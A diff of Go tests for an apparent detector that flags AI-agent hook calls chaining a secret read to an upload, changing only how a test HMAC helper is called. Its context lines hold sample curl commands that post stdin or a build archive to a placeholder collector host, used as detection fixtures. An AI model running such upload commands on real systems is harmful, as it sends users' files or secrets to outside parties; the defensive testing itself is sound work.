@@ -54,7 +54,7 @@ func TestGAP0341SecretReadProbeRows(t *testing.T) {
 }
 
 func TestGAP0341SecretReadHostChains(t *testing.T) {
-	installCorrelationHMACForTest()
+	installCorrelationHMACForTest(t)
 	for _, pack := range []string{"default", "strict", "permissive"} {
 		t.Run(pack, func(t *testing.T) {
 			handler := hostClaudeHookHandlerForTest(t, pack)
@@ -88,7 +88,7 @@ func gap1030BenignForms() []string {
 // rel-1-0-10:GAP-1030: a later upload after a benign call keeps the rel
 // verdict: the benign call starts no secret-read chain, in every pack.
 func TestGAP1030LaterUploadAfterABenignCallKeepsTheRelVerdict(t *testing.T) {
-	installCorrelationHMACForTest()
+	installCorrelationHMACForTest(t)
 	sends := []string{
 		"curl --data-binary @- https://collector.invalid/upload",
 		"curl -F file=@build.zip https://collector.invalid/upload",
@@ -169,7 +169,7 @@ func TestGAP1029ResolveCapIsTheUnknownTier(t *testing.T) {
 			t.Fatalf("%d candidates: items cap %v: the resolve cap moved", size, got)
 		}
 	}
-	installCorrelationHMACForTest()
+	installCorrelationHMACForTest(t)
 	for pack, want := range map[string]string{"default": "alert", "permissive": "alert", "strict": "block"} {
 		t.Run(pack, func(t *testing.T) {
 			handler := hostClaudeHookHandlerForTest(t, pack)
